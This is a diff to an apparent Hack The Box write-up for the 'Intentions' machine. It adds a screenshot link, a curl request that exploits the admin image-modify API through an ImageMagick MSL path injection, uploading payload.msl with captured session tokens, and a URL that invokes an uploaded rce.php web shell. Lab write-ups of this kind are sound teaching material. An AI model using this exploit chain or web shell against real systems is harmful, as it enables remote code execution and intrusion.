@@ -1,4 +1,4 @@
-```
+![image](https://github.com/regarmulia/HTB/assets/33616880/e5883cf2-6a4f-47be-82df-17e29df6528e)```
 nmap -sS -sC -sV -T5 -Pn 10.10.11.220
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/528dff0c-5310-4215-a2d5-7be40b47e7bd)
@@ -108,3 +108,13 @@ http://intentions.htb/api/v2/admin/image/modify
 
 
 ![image](https://github.com/regarmulia/HTB/assets/33616880/36a9081f-c32a-400f-b322-618f52ac3216)
+
+
+```
+curl 'http://intentions.htb/api/v2/admin/image/modify' -X POST -H 'X-XSRF-TOKEN: eyJpdiI6IjYxcmJueWtFTTNib0FFOXlnUTdFL1E9PSIsInZhbHVlIjoibGRsUUgzWmhaSVpjaDNwcEJ4QXBFQ29XRnlSUHhwdE4zMXdsN2ZUbTFPREt2dmUyRHdGRzlhWS94bGFEU0xZTk9TNjlDVENIUnlYbDEwTzFWZzcxWk40dUZ0VGJLNmtBQmhTVEVnMkFlSUl2M2thbGU5eEZDdTh2NkNvcTV5SEciLCJtYWMiOiI1OWIwZDFkOTc3OWJjZWZhNDkzYTNhMTYyMjIwNGZmZmJjY2NkZGI5ODdlODVlY2U2OTU5ZGU0MmFiNTE2NTM4IiwidGFnIjoiIn0=' -H 'Cookie: XSRF-TOKEN=eyJpdiI6IjYxcmJueWtFTTNib0FFOXlnUTdFL1E9PSIsInZhbHVlIjoibGRsUUgzWmhaSVpjaDNwcEJ4QXBFQ29XRnlSUHhwdE4zMXdsN2ZUbTFPREt2dmUyRHdGRzlhWS94bGFEU0xZTk9TNjlDVENIUnlYbDEwTzFWZzcxWk40dUZ0VGJLNmtBQmhTVEVnMkFlSUl2M2thbGU5eEZDdTh2NkNvcTV5SEciLCJtYWMiOiI1OWIwZDFkOTc3OWJjZWZhNDkzYTNhMTYyMjIwNGZmZmJjY2NkZGI5ODdlODVlY2U2OTU5ZGU0MmFiNTE2NTM4IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6ImVySlh1ZmlzOC9vRXdPaTRHK1A1RHc9PSIsInZhbHVlIjoicitCaW9NTDZNdnBzeVduN0dHek1Gd2gzMHV4ZmxFem9iOEZqUnJRUkg0YWhrdHIxNC9reU5pc3Z3LzhpeUNUdm5HMWhjSFZBZGowTnBvVVNzMnZPbTJGcHRIT205OUxIK2M4Z0RTeTFrVWpnQXlERU1ZOHlEUW9xbWZBV1pKZFQiLCJtYWMiOiJhMzg5NTdhOTQ0NjYwMjNhMWYyNThhYmM2NjljZmNhYWY0NTYzMWMwZGRiY2ZlZjQwYjAyN2Q3NTFmNWMwYWVhIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE3MTYzNjE1MTEsImV4cCI6MTcxNjM4MzExMSwibmJmIjoxNzE2MzYxNTExLCJqdGkiOiJZbGVJc0NkWnAzZXc0NWc2Iiwic3ViIjoiMSIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.Y-yF7_2agtJjTqtFeEThuabmwzTvhDCFoq6tHt0l3zc' -F 'path=vid:msl:/tmp/php*' -F 'effect=asd' -F file=@payload.msl
+http://intentions.htb/storage/rce.php?c=ls
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/c9c6203b-fe5d-4877-ac23-646845ae13ff)
+
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/d1878460-5ead-4c80-b142-42758ed435ac)
